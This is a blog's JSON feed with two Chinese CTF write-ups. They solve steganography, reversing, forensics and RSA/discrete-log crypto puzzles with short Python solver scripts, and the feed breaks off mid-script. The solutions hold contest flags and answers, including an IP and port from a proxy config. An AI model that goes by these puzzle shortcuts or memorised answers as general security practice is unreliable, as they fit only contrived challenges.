{
    "version": "https://jsonfeed.org/version/1",
    "title": "null • All posts by \"wp\" tag",
    "description": "欢迎来到Huan的笔记空间~~~~~~🌸",
    "home_page_url": "http://example.com",
    "items": [
        {
            "id": "http://example.com/2024/04/15/%E5%8C%97%E5%8C%BA-%E6%95%B0%E4%BF%A1%E6%9D%AFWP/",
            "url": "http://example.com/2024/04/15/%E5%8C%97%E5%8C%BA-%E6%95%B0%E4%BF%A1%E6%9D%AFWP/",
            "title": "北区-数信杯WP",
            "date_published": "2024-04-15T08:04:30.000Z",
            "content_html": "<h1 id=\"第二届数据安全大赛暨首届数信杯_wp\"><a class=\"markdownIt-Anchor\" href=\"#第二届数据安全大赛暨首届数信杯_wp\">#</a> 第二届数据安全大赛暨首届 “数信杯”_WP</h1>\n<p><img data-src=\"/img/%E6%95%B0%E4%BF%A1%E6%9D%AFwp/image-20240414163012378.png\" alt=\"image-20240414163012378\"></p>\n<h2 id=\"magic-audio\"><a class=\"markdownIt-Anchor\" href=\"#magic-audio\">#</a> Magic Audio</h2>\n<blockquote>\n<p>SSTV 解密：</p>\n</blockquote>\n<p><img data-src=\"/img/%E6%95%B0%E4%BF%A1%E6%9D%AFwp/30A50ACF8D6CFF45F112140CE485F4B5.png\" alt=\"img\"></p>\n<blockquote>\n<p>binwalk 分离</p>\n</blockquote>\n<p><img data-src=\"/img/%E6%95%B0%E4%BF%A1%E6%9D%AFwp/691BCBB7B8BE2A80F88467915DB7A84A.png\" alt=\"img\"></p>\n<blockquote>\n<p>将菜就多练当作密钥输入压缩包得到 flag</p>\n</blockquote>\n<h2 id=\"rrrrcccc\"><a class=\"markdownIt-Anchor\" href=\"#rrrrcccc\">#</a> rrrrcccc</h2>\n<blockquote>\n<p>upx 去壳后打开程序，分析就是两次异或，一次 rc4 一次异或 key，我 patch 密文让他异或 rc4 后，手动异或一下 key 即可</p>\n</blockquote>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre>a <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>  <span class=\"token number\">0x57</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x68</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x61</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x74</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x61</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x72</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x65</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x79</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x75</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>  <span class=\"token number\">0x72</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x65</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x63</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x72</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x79</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x70</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x74</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x69</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6F</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>  <span class=\"token number\">0x6E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x26</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x64</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x65</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x63</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x72</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x79</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x70</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x74</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x69</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>  <span class=\"token number\">0x6F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x6E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x62</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x61</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x73</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x69</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x63</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x73</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>b <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span>  <span class=\"token number\">0x31</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x00</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x13</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1A</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x16</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x56</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x1D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x43</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>  <span class=\"token number\">0x4B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x04</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5D</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x57</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x13</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4C</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x41</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x5E</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0A</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>  <span class=\"token number\">0x5F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x42</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x56</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x56</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x07</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x44</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x4B</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x41</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x41</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x50</span><span class=\"token punctuation\">,</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>  <span class=\"token number\">0x5F</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x56</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x50</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x56</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x10</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x59</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x52</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x0E</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token comment\"># print(len(a))</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token comment\"># print(len(b))</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    <span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">chr</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token operator\">^</span>b<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span>end<span class=\"token operator\">=</span><span class=\"token string\">''</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h2 id=\"classic_image_steganography\"><a class=\"markdownIt-Anchor\" href=\"#classic_image_steganography\">#</a> Classic_image_steganography</h2>\n<p><img data-src=\"/img/%E6%95%B0%E4%BF%A1%E6%9D%AFwp/image-20240414161818188.png\" alt=\"image-20240414161818188\"></p>\n<blockquote>\n<p>修改文件头</p>\n</blockquote>\n<p><img data-src=\"/img/%E6%95%B0%E4%BF%A1%E6%9D%AFwp/image-20240414161928432.png\" alt=\"image-20240414161928432\"></p>\n<blockquote>\n<p>给了一张空白的图片，修改高度即可看到下方 flag</p>\n</blockquote>\n<p><img data-src=\"/img/%E6%95%B0%E4%BF%A1%E6%9D%AFwp/image-20240414162012262.png\" alt=\"image-20240414162012262\"></p>\n<p><img data-src=\"/img/%E6%95%B0%E4%BF%A1%E6%9D%AFwp/image-20240414162019739.png\" alt=\"image-20240414162019739\"></p>\n<h2 id=\"不安全的u盘1\"><a class=\"markdownIt-Anchor\" href=\"#不安全的u盘1\">#</a> 不安全的 U 盘.1</h2>\n<p><img data-src=\"/img/%E6%95%B0%E4%BF%A1%E6%9D%AFwp/image-20240414162247434.png\" alt=\"image-20240414162247434\"></p>\n<h2 id=\"不安全的u盘2\"><a class=\"markdownIt-Anchor\" href=\"#不安全的u盘2\">#</a> 不安全的 U 盘.2</h2>\n<p><img data-src=\"/img/%E6%95%B0%E4%BF%A1%E6%9D%AFwp/image-20240414162334045.png\" alt=\"image-20240414162334045\"></p>\n<h2 id=\"不安全的u盘3\"><a class=\"markdownIt-Anchor\" href=\"#不安全的u盘3\">#</a> 不安全的 U 盘.3</h2>\n<p><img data-src=\"/img/%E6%95%B0%E4%BF%A1%E6%9D%AFwp/image-20240414162449852.png\" alt=\"image-20240414162449852\"></p>\n<h2 id=\"不安全的u盘4\"><a class=\"markdownIt-Anchor\" href=\"#不安全的u盘4\">#</a> 不安全的 U 盘.4</h2>\n<p>题目提到了后渗透，同时涉及到了远程 IP 和端口，肯定是搭建代理了，直接检索最常用的代理软件 frp 配置文件默认参数名 remote_port 之类的 ，得到答案 118.180.126.13_6770</p>\n<p><img data-src=\"/img/%E6%95%B0%E4%BF%A1%E6%9D%AFwp/8c5c8716-0941-4c3a-a785-eecc7a252691.png\" alt=\"image-20240414161028946\"></p>\n<h2 id=\"网站的数据绝对安全1\"><a class=\"markdownIt-Anchor\" href=\"#网站的数据绝对安全1\">#</a> 网站的数据绝对安全.1</h2>\n<blockquote>\n<p>流量包 11 流</p>\n</blockquote>\n<p><img data-src=\"/img/%E6%95%B0%E4%BF%A1%E6%9D%AFwp/image-20240414161028946.png\" alt=\"image-20240414161028946\"></p>\n<blockquote>\n<p>得到用户名</p>\n</blockquote>\n<h2 id=\"网站的数据绝对安全2\"><a class=\"markdownIt-Anchor\" href=\"#网站的数据绝对安全2\">#</a> 网站的数据绝对安全.2</h2>\n<p>导出所有的 http 文件。</p>\n<p><img data-src=\"/img/%E6%95%B0%E4%BF%A1%E6%9D%AFwp/image-20240414161118780.png\" alt=\"image-20240414161118780\"></p>\n<h2 id=\"bitcoin4\"><a class=\"markdownIt-Anchor\" href=\"#bitcoin4\">#</a> Bitcoin.4</h2>\n<blockquote>\n<p>gpt 秒了</p>\n</blockquote>\n<p><img data-src=\"/img/%E6%95%B0%E4%BF%A1%E6%9D%AFwp/image-20240414161313115.png\" alt=\"image-20240414161313115\"></p>\n<h2 id=\"easyjava\"><a class=\"markdownIt-Anchor\" href=\"#easyjava\">#</a> easyjava</h2>\n<p>某个精通百家姓的开发者把自己的小秘密藏在了附件中，来查查他有什么秘密。</p>\n<p>给的附件为.hprof 文件</p>\n<p>用 java 自带的 VisualIVM 去查看。</p>\n<p><img data-src=\"/img/%E6%95%B0%E4%BF%A1%E6%9D%AFwp/bcf9782e-73eb-4df1-b92d-aec244c0c628.png\" alt=\"image-20240414161028946\"></p>\n<p><img data-src=\"/img/%E6%95%B0%E4%BF%A1%E6%9D%AFwp/a09f3c0c-3456-4b27-bd4c-ad27518a4361.png\" alt=\"image-20240414161028946\"></p>\n<p>大概翻阅几下，找到几串百家姓密文</p>\n<p>解密得到</p>\n<p><img data-src=\"/img/%E6%95%B0%E4%BF%A1%E6%9D%AFwp/0d4c10f9-3d7d-4d68-981b-685b70c111e6.png\" alt=\"image-20240414161028946\"></p>\n<p><img data-src=\"/img/%E6%95%B0%E4%BF%A1%E6%9D%AFwp/9a84f1ed-4bb2-4046-b6dd-66f71ad72897.png\" alt=\"image-20240414161028946\"></p>\n<blockquote aa534ac5-2f1a-466c-baf7-1ad7edb6adb2=\"\">\n<p>一串 base64 密文和类似码表的东西</p>\n<p>观测 base64 码表长度小于 64，进行补齐，发现缺的为 A Z 两个大写字母（下面有用 悲！</p>\n<p>密文的 UVWXY 很明显是瞎填充的。。。删除即可</p>\n<p>此时密文为：pCNxpTJxojkPd65zdiQOpz5xbjgSdCcJoC5CdOQNomgTpmhydC5oz9</p>\n<p>而解密结果为：flag {aa534ac5-2f1a-466c-baf7-1ad7edb6aX.</p>\n<p>此时要用到 A Z 两个字母，进行尝试后</p>\n<p>pCNxpTJxojkPd65zdiQOpz5xbjgSdCcJoC5CdOQNomgTpmhydC5Aoz9Z</p>\n<p>发现此时能的够正确的得到明文</p>\n<p>flag</p>\n</blockquote>\n",
            "tags": [
                "wp"
            ]
        },
        {
            "id": "http://example.com/2024/03/04/qsnctf-round1-wp/",
            "url": "http://example.com/2024/03/04/qsnctf-round1-wp/",
            "title": "qsnctf_round1_wp",
            "date_published": "2024-03-04T10:34:35.000Z",
            "content_html": "<h1 id=\"青少年ctf擂台挑战赛-2024-round-1_wp\"><a class=\"markdownIt-Anchor\" href=\"#青少年ctf擂台挑战赛-2024-round-1_wp\">#</a> 青少年 CTF 擂台挑战赛 2024 #Round 1_WP</h1>\n<blockquote>\n<p>排名：3</p>\n</blockquote>\n<p><img data-src=\"/img/qsnctf_round1/image-20240301220119039.png\" alt=\"image-20240301220119039\"></p>\n<h2 id=\"crypto\"><a class=\"markdownIt-Anchor\" href=\"#crypto\">#</a> CRYPTO</h2>\n<h3 id=\"四重加密\"><a class=\"markdownIt-Anchor\" href=\"#四重加密\">#</a> 四重加密</h3>\n<p>压缩包备注</p>\n<blockquote>\n<p>OFZW4Y3UMY======</p>\n</blockquote>\n<p>base64 解得</p>\n<blockquote>\n<p>qsnctf</p>\n</blockquote>\n<p>解开压缩包得到 HTML 转移得到 md 格式问题自己转成维吉尼亚加密形式</p>\n<blockquote>\n<p>zcye{mxmemtxrzt_lzbha_kwmqzec}|key=hello</p>\n</blockquote>\n<p>得到 rot13 的 flag</p>\n<blockquote yqitbfqnoi_xsxwp_wpifoqv=\"\">\n<p>synt</p>\n</blockquote>\n<blockquote ldvgosdabv_kfkjc_jcvsbdi=\"\">\n<p>flag</p>\n</blockquote>\n<h3 id=\"ez_log\"><a class=\"markdownIt-Anchor\" href=\"#ez_log\">#</a> ez_log</h3>\n<p>附件：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> random <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>flag<span class=\"token operator\">=</span><span class=\"token string\">b'key&#123;xxxxxxx&#125;'</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>m<span class=\"token operator\">=</span>bytes_to_long<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>p<span class=\"token operator\">=</span><span class=\"token number\">3006156660704242356836102321001016782090189571028526298055526061772989406357037170723984497344618257575827271367883545096587962708266010793826346841303043716776726799898939374985320242033037</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>g<span class=\"token operator\">=</span><span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>c<span class=\"token operator\">=</span><span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>g<span class=\"token punctuation\">,</span>m<span class=\"token punctuation\">,</span>p<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'c='</span></span><span class=\"token punctuation\">,</span>c<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>    c<span class=\"token operator\">=</span><span class=\"token number\">2253565561143760792334512129664721558389652360283869919781040673562790797442214510219594286692887815068304926805836174262275347087135150894599629786923362784354321271799896941439805091639376</span></pre></td></tr></table></figure><p>参考链接：<span class=\"exturl\" data-url=\"aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0x1aWluby9hcnRpY2xlL2RldGFpbHMvMTI2MTE3OTg1\">BUUCTF——CRYPTO（记录不熟悉的题）(4)</span></p>\n<p><strong>离散对数问题</strong></p>\n<blockquote>\n<p>a^x ≡ b (mod m)<br>\n 求解 x</p>\n</blockquote>\n<p>利用 sympy 库中的 discrete_log (x,y,z) 函数可求解，x: 模数，y: 余数，z: 底数</p>\n<p>代码如下：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> sympy</pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">import</span> binascii</pre></td></tr><tr><td data-num=\"4\"></td><td><pre> </pre></td></tr><tr><td data-num=\"5\"></td><td><pre>m <span class=\"token operator\">=</span> <span class=\"token number\">3</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>c<span class=\"token operator\">=</span><span class=\"token number\">2253565561143760792334512129664721558389652360283869919781040673562790797442214510219594286692887815068304926805836174262275347087135150894599629786923362784354321271799896941439805091639376</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>p<span class=\"token operator\">=</span><span class=\"token number\">3006156660704242356836102321001016782090189571028526298055526061772989406357037170723984497344618257575827271367883545096587962708266010793826346841303043716776726799898939374985320242033037</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre> </pre></td></tr><tr><td data-num=\"11\"></td><td><pre> </pre></td></tr><tr><td data-num=\"12\"></td><td><pre>flag <span class=\"token operator\">=</span> sympy<span class=\"token punctuation\">.</span>discrete_log<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> c<span class=\"token punctuation\">,</span> m<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>long_to_bytes<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\"># b'key&#123;lLNYs7&#125;'</span></pre></td></tr></table></figure><p>把 key 放进去即可得到 flag</p>\n<h3 id=\"解个方程\"><a class=\"markdownIt-Anchor\" href=\"#解个方程\">#</a> 解个方程</h3>\n<pre><code>欢迎来到青少年CTF，领取你的题目，进行解答吧！这是一道数学题！！\n    p = 173834522485366574285361213529180163119\n    q = 122713369465742269313197063464523776107\n    e = 65537\n    d = ?\n    \n</code></pre>\n<p>脚本；</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> gmpy2</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>p <span class=\"token operator\">=</span> <span class=\"token number\">173834522485366574285361213529180163119</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>q <span class=\"token operator\">=</span> <span class=\"token number\">122713369465742269313197063464523776107</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token number\">65537</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>d <span class=\"token operator\">=</span> gmpy2<span class=\"token punctuation\">.</span>invert<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>p <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span> <span class=\"token punctuation\">(</span>q <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre></pre></td></tr><tr><td data-num=\"9\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span>d<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token comment\"># 15100911795189740543592377616991756144840586906302883747149248640494852701369</span></pre></td></tr></table></figure><h3 id=\"ezrsa\"><a class=\"markdownIt-Anchor\" href=\"#ezrsa\">#</a> ezrsa</h3>\n<p>源码：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>flag <span class=\"token operator\">=</span> <span class=\"token string\">b'qsnctf&#123;xxx-xxxx-xxxx-xxxx-xxxxxxxxx&#125;'</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>m <span class=\"token operator\">=</span> bytes_to_long<span class=\"token punctuation\">(</span>flag<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>p <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">512</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>q <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">512</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>r <span class=\"token operator\">=</span> getPrime<span class=\"token punctuation\">(</span><span class=\"token number\">512</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>n <span class=\"token operator\">=</span> p <span class=\"token operator\">*</span> q <span class=\"token operator\">*</span> r</pre></td></tr><tr><td data-num=\"8\"></td><td><pre>leak <span class=\"token operator\">=</span> p <span class=\"token operator\">*</span> q</pre></td></tr><tr><td data-num=\"9\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token number\">0x10001</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">,</span> e<span class=\"token punctuation\">,</span> n<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'c = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>c<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'n = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>n<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string-interpolation\"><span class=\"token string\">f'leak = </span><span class=\"token interpolation\"><span class=\"token punctuation\">&#123;</span>leak<span class=\"token punctuation\">&#125;</span></span><span class=\"token string\">'</span></span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token comment\"># c = 173595148273920891298949441727054328036798235134009407863895058729356993814829340513336567479145746034781201823694596731886346933549577879568197521436900228804336056005940048086898794965549472641334237175801757569154295743915744875800647234151498117718087319013271748204766997008772782882813572814296213516343420236873651060868227487925491016675461540894535563805130406391144077296854410932791530755245514034242725719196949258860635915202993968073392778882692892</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre><span class=\"token comment\"># n = 1396260492498511956349135417172451037537784979103780135274615061278987700332528182553755818089525730969834188061440258058608031560916760566772742776224528590152873339613356858551518007022519033843622680128062108378429621960808412913676262141139805667510615660359775475558729686515755127570976326233255349428771437052206564497930971797497510539724340471032433502724390526210100979700467607197448780324427953582222885828678441579349835574787605145514115368144031247</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\"># leak = 152254254502019783796170793516692965417859793325424454902983763285830332059600151137162944897787532369961875766745853731769162511788354655291037150251085942093411304833287510644995339391240164033052417935316876168953838783742499485868268986832640692657031861629721225482114382472324320636566226653243762620647</span></pre></td></tr></table></figure><p><code>n//leak</code>  即可得到 r，用 r 求逆元后再 <code>pow(c, d, r)</code>  即可得到 flag。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> gmpy2</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> Crypto<span class=\"token punctuation\">.</span>Util<span class=\"token punctuation\">.</span>number <span class=\"token keyword\">import</span> long_to_bytes</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>c <span class=\"token operator\">=</span> <span class=\"token number\">173595148273920891298949441727054328036798235134009407863895058729356993814829340513336567479145746034781201823694596731886346933549577879568197521436900228804336056005940048086898794965549472641334237175801757569154295743915744875800647234151498117718087319013271748204766997008772782882813572814296213516343420236873651060868227487925491016675461540894535563805130406391144077296854410932791530755245514034242725719196949258860635915202993968073392778882692892</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>n <span class=\"token operator\">=</span> <span class=\"token number\">1396260492498511956349135417172451037537784979103780135274615061278987700332528182553755818089525730969834188061440258058608031560916760566772742776224528590152873339613356858551518007022519033843622680128062108378429621960808412913676262141139805667510615660359775475558729686515755127570976326233255349428771437052206564497930971797497510539724340471032433502724390526210100979700467607197448780324427953582222885828678441579349835574787605145514115368144031247</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>leak <span class=\"token operator\">=</span> <span class=\"token number\">152254254502019783796170793516692965417859793325424454902983763285830332059600151137162944897787532369961875766745853731769162511788354655291037150251085942093411304833287510644995339391240164033052417935316876168953838783742499485868268986832640692657031861629721225482114382472324320636566226653243762620647</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>r <span class=\"token operator\">=</span> n<span class=\"token operator\">//</span>leak</pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>e <span class=\"token operator\">=</span> <span class=\"token number\">0x10001</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre></pre></td></tr><tr><td data-num=\"13\"></td><td><pre><span class=\"token comment\"># print(r)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>d <span class=\"token operator\">=</span> gmpy2<span class=\"token punctuation\">.</span>invert<span class=\"token punctuation\">(</span>e<span class=\"token punctuation\">,</span><span class=\"token punctuation\">(</span>r <span class=\"token operator\">-</span> <span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre><span class=\"token comment\"># print(d)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>m <span class=\"token operator\">=</span> <span class=\"token builtin\">pow</span><span class=\"token punctuation\">(</span>c<span class=\"token punctuation\">,</span> d<span class=\"token punctuation\">,</span> r<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>flag <span class=\"token operator\">=</span> long_to_bytes<span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token 